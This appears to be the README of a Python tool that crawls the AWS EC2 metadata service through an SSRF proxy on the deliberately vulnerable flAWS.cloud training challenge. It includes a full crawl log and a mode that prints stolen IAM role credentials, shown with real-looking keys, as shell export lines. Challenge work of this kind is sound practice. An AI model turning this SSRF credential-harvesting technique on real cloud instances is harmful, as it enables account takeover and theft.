# aws-imds-spider
Spiders the AWS EC2 IMDS API using a proxy on that EC2.

_Software is still in development phase, used only for an AWS security challenge_


## ./imds_spider.py -h
Shows the help

```
$ ./imds_spider.py -h
usage: IMDS Spider [-h] [-p PROXY] [-o OUTPUT] [-ii] [-c]

options:
  -h, --help            show this help message and exit
  -p PROXY, --proxy PROXY
                        base url for IMDS, use http:// for local
  -o OUTPUT, --output OUTPUT
                        write json to the file
  -ii, --instance-identity
                        only instance-identity
  -c, --creds           print env script with creds
```

## ./imds_spider.py --proxy http://
Specify `--proxy http://` for local IMDS spidering on an EC2 (untested).

Note that the proxy has a default value with an endpoint of the http://flAWS.cloud challenge.
That challenge exposes an URL that is on-purpose vulnerable to an SSRF attack, as it shows in the challenge.
Or specify that url as `--proxy`.

## ./imds_spider.py --output imds.json
Writes the collected json structure to the file.

See the example file stored in this repo.

Logs while spidering:
```
[+] IMDS at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254
[+] Get /latest ... OK
[+] Get /latest/dynamic ... OK
[+] Get /latest/dynamic/instance-identity ... OK
[+] Get /latest/dynamic/instance-identity/signature ... OK
[+] Get /latest/dynamic/instance-identity/rsa2048 ... OK
[+] Get /latest/dynamic/instance-identity/document ... OK
[+] Get /latest/dynamic/instance-identity/pkcs7 ... OK
[+] Get /latest/meta-data ... OK
[+] Get /latest/meta-data/ami-id ... OK
[+] Get /latest/meta-data/ami-id/ami-7c803d1c ... OK
[+] Get /latest/meta-data/ami-launch-index ... OK
[+] Get /latest/meta-data/ami-launch-index/0 ... OK
[+] Get /latest/meta-data/ami-manifest-path ... OK
[+] Get /latest/meta-data/ami-manifest-path/(unknown) ... OK
[+] Get /latest/meta-data/block-device-mapping ... OK
[+] Get /latest/meta-data/block-device-mapping/ami ... OK
[+] Get /latest/meta-data/block-device-mapping/ami//dev/sda1 ... OK
[+] Get /latest/meta-data/block-device-mapping/root ... OK
[+] Get /latest/meta-data/block-device-mapping/root//dev/sda1 ... OK
[+] Get /latest/meta-data/events ... OK
[+] Get /latest/meta-data/events/maintenance ... OK
[+] Get /latest/meta-data/events/maintenance/history ... OK
[+] Get /latest/meta-data/events/maintenance/history/[] ... OK
[+] Get /latest/meta-data/events/maintenance/scheduled ... OK
[+] Get /latest/meta-data/events/maintenance/scheduled/[] ... OK
[+] Get /latest/meta-data/hostname ... OK
[+] Get /latest/meta-data/hostname/ip-172-31-41-84.us-west-2.compute.internal ... OK
[+] Get /latest/meta-data/iam ... OK
[+] Get /latest/meta-data/iam/info ... OK
[+] Get /latest/meta-data/iam/security-credentials ... OK
[+] Get /latest/meta-data/iam/security-credentials/flaws ... OK
[+] Get /latest/meta-data/identity-credentials ... OK
[+] Get /latest/meta-data/identity-credentials/ec2 ... OK
[+] Get /latest/meta-data/identity-credentials/ec2/info ... OK
[+] Get /latest/meta-data/identity-credentials/ec2/security-credentials ... OK
[+] Get /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance ... OK
[+] Get /latest/meta-data/instance-action ... OK
[+] Get /latest/meta-data/instance-action/none ... OK
[+] Get /latest/meta-data/instance-id ... OK
[+] Get /latest/meta-data/instance-id/i-05bef8a081f307783 ... OK
[+] Get /latest/meta-data/instance-life-cycle ... OK
[+] Get /latest/meta-data/instance-life-cycle/on-demand ... OK
[+] Get /latest/meta-data/instance-type ... OK
[+] Get /latest/meta-data/instance-type/t2.micro ... OK
[+] Get /latest/meta-data/local-hostname ... OK
[+] Get /latest/meta-data/local-hostname/ip-172-31-41-84.us-west-2.compute.internal ... OK
[+] Get /latest/meta-data/local-ipv4 ... OK
[+] Get /latest/meta-data/local-ipv4/172.31.41.84 ... OK
[+] Get /latest/meta-data/mac ... OK
[+] Get /latest/meta-data/mac/06:b0:7a:92:21:cf ... OK
[+] Get /latest/meta-data/metrics ... OK
[+] Get /latest/meta-data/metrics/vhostmd ... OK
[+] Get /latest/meta-data/network ... OK
[+] Get /latest/meta-data/network/interfaces ... OK
[+] Get /latest/meta-data/network/interfaces/macs ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/device-number ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/device-number/0 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/interface-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/interface-id/eni-c26ed780 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/ipv4-associations ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/ipv4-associations/35.165.182.7 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/ipv4-associations/35.165.182.7/172.31.41.84 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-hostname ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-hostname/ip-172-31-41-84.us-west-2.compute.internal ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-ipv4s ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/local-ipv4s/172.31.41.84 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/mac ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/mac/06:b0:7a:92:21:cf ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/owner-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/owner-id/975426262029 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-hostname ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-hostname/ec2-35-165-182-7.us-west-2.compute.amazonaws.com ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-ipv4s ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/public-ipv4s/35.165.182.7 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-group-ids ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-group-ids/sg-490f6631 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-groups ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/security-groups/launch-wizard-1 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-id/subnet-d962aa90 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-ipv4-cidr-block ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/subnet-ipv4-cidr-block/172.31.32.0/20 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-id ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-id/vpc-1052ce77 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-block ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-block/172.31.0.0/16 ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-blocks ... OK
[+] Get /latest/meta-data/network/interfaces/macs/06:b0:7a:92:21:cf/vpc-ipv4-cidr-blocks/172.31.0.0/16 ... OK
[+] Get /latest/meta-data/placement ... OK
[+] Get /latest/meta-data/placement/availability-zone ... OK
[+] Get /latest/meta-data/placement/availability-zone/us-west-2a ... OK
[+] Get /latest/meta-data/placement/region ... OK
[+] Get /latest/meta-data/placement/region/us-west-2 ... OK
[+] Get /latest/meta-data/profile ... OK
[+] Get /latest/meta-data/profile/default-hvm ... OK
[+] Get /latest/meta-data/public-hostname ... OK
[+] Get /latest/meta-data/public-hostname/ec2-35-165-182-7.us-west-2.compute.amazonaws.com ... OK
[+] Get /latest/meta-data/public-ipv4 ... OK
[+] Get /latest/meta-data/public-ipv4/35.165.182.7 ... OK
[+] Get /latest/meta-data/public-keys ... OK
[+] Get /latest/meta-data/public-keys/0=Default ... OK
[+] Get /latest/meta-data/reservation-id ... OK
[+] Get /latest/meta-data/reservation-id/r-0fe151dbbe77e90cc ... OK
[+] Get /latest/meta-data/security-groups ... OK
[+] Get /latest/meta-data/security-groups/launch-wizard-1 ... OK
[+] Get /latest/meta-data/services ... OK
[+] Get /latest/meta-data/services/domain ... OK
[+] Get /latest/meta-data/services/domain/amazonaws.com ... OK
[+] Get /latest/meta-data/services/partition ... OK
[+] Get /latest/meta-data/services/partition/aws ... OK
[+] Get /latest/user-data ... OK
```

The JSON is not shown when the output file is configured.


## ./imds_spider.py --instance-identity
Only collect the EC2 instance-identity, so doesn't spider.

Example:
```
[+] IMDS at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254
[+] Get latest/dynamic/instance-identity/document ... OK
{
    "latest/dynamic/instance-identity": "document",
    "latest/dynamic/instance-identity/document": {
        "accountId": "975426262029",
        "architecture": "x86_64",
        "availabilityZone": "us-west-2a",
        "billingProducts": null,
        "devpayProductCodes": null,
        "marketplaceProductCodes": null,
        "imageId": "ami-7c803d1c",
        "instanceId": "i-05bef8a081f307783",
        "instanceType": "t2.micro",
        "kernelId": null,
        "pendingTime": "2017-02-12T22:29:24Z",
        "privateIp": "172.31.41.84",
        "ramdiskId": null,
        "region": "us-west-2",
        "version": "2017-09-30"
    }
}
Finished.
```

## ./imds_spider.py --creds
Only collects http://flAWS.cloud specific access keys; two different sets.
Displays the collected info as a bash script with variable exports.
Uses the `aws cli` environment variables.

Output are lines of bash script to copy:
```
[+] IMDS at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254
[+] Get latest/dynamic/instance-identity/document ... OK
[+] Get latest/meta-data/iam/security-credentials ... OK
[+] Get latest/meta-data/iam/security-credentials/flaws ... OK
echo Copy these aws cli credentials for http://flAWS.cloud challenge
export ACCOUNT_ID=975426262029
export INSTANCE_ID=i-05bef8a081f307783
export AWS_REGION=us-west-2
export ROLE=flaws
# or use: aws configure with --profile flaws
export AWS_ACCESS_KEY_ID=ASIA6GG7PSQG5A6XKAF5
export AWS_SECRET_ACCESS_KEY=h/YKYfir/Z4JLr8Hy+0MQB3e9a4VlmLPQ2yytxhH
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEEkaCXVzLXdlc3QtMiJGMEQCIHQD6kGEwKAtG23r8WwY8yD43TNZ95jOo1HOlICUrpAYAiA0Zwvd8hosbEmXpSINGE6XbLU7VNYJS1bFn9O+K5knWSrSBAhyEAMaDDk3NTQyNjI2MjAyOSIMos3f8U8Ufl7Zr+iYKq8EfgjYVfDxmwPoSa0U06wukxOk8LiFYy7YfdnzBdmYIDyTS26+R5qfelqbA3d4AiKbvibZQX/keVhX029KkJ3H+dG5SaqccrNPnV5h6Kcdi8OqutMVFH77N6IYzQpSSajcXTmQ2Z1RE508Yj/1s6oXVk6pqAihiBIWPgaIZm445hKt7zwihsQC8IvAQvFEN1vhts5h7fjXMOq731Yam2FqiYeOLARNpQyN0Vfk2Ie3Yr2EeCQiJ+NOL71TmeWxXqbUAyi9z8b1k5AAGBJcqgjXOXkkeIJomdEKc3HFI0V3THcXzu6DwvShbJM8OFSZaNwh6VF2+KI+tLLcI3h/d0uWQ10HVIy4PkfdkrwTkJH6sOfEW1bL6P/9F9CQntw3JdoXYeAHwzD6HvcWnn8mg3KtEjWLV28vARcBgwwaBA+YqvvHv9NvuNltU2VETthXctFheT/1F6ZqLrQoSZbdtvkEYlyiGy3QjOhxARd4RPglhJ55FoosT9DpLFAWxGAUe9ZtQIGd7Rn46spW98kND4WAphpqAqEfxJJoh0X8y68J90OOKy19xLDAznKrKQM8B5Jl7s7u0yZVPkjmG+kgle6IPHjBATucNAQu5BCXt+1hGME4MOmUpDZRu0g8HmEAkjfAwiR8a9E7EqPqo6Rdhg9jXmg4/05mclrSpUEEM+CESjVvqldpVBoz3Vn/pKduqKgy9dW5GuDeBDiORYANPF/OTIX8EkZghjkG0KPtO+vtlTDItIWWBjqqARkgphm2LOcsTuYBRgtWTkZdcr/qDjJqSWldvqNvl9SReumYUXYGbfOI9GuYCP8VmqYaw2GyESS1op+yM39zpkxkPlvnnimjdjgB36+4Hcjd2fEisl+3ZYQ9ZHiyvAv5QCbAA0f1JI1aP3Z3nV4MrtaBYcocVW0C1sYew1mP71XrGHx5k+A1oR93OUOr0gVoOa4O9mqMjNeMdMJ9yG5dgAXhT9f5JFlk4+BY
# apply these, then call: aws sts get-caller-identity
```



